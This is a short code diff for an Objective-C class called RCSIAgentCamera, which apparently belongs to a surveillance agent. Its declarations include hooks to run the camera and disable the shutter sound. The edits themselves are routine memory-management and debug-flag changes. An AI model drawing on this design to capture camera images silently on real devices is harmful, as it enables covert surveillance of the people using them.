@@ -14,7 +14,7 @@
 
 #import "RCSICameraSupport.h"
 
-#define DEBUG_CAMERA_
+//#define DEBUG_CAMERA_
 
 typedef NSData* (*camera_t) (NSInteger);
 typedef void (*disableSound_t)(void);
@@ -24,6 +24,8 @@ static camera_t runCamera;
 static disableSound_t disableShutterSound;
 
 @implementation RCSIAgentCamera
+
+@synthesize mAgentConfiguration;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -302,6 +304,10 @@ static disableSound_t disableShutterSound;
 #ifdef DEBUG_CAMERA_
     NSLog(@"%s: agent camera stopped", __FUNCTION__);
 #endif
+  
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
+  
   [outerPool release];
 }
 
@@ -323,20 +329,6 @@ static disableSound_t disableShutterSound;
 - (BOOL)resume
 {
   return YES;
-}
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-    {
-      [mAgentConfiguration release];
-      mAgentConfiguration = [aConfiguration retain];
-    }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
 }
 
 @end
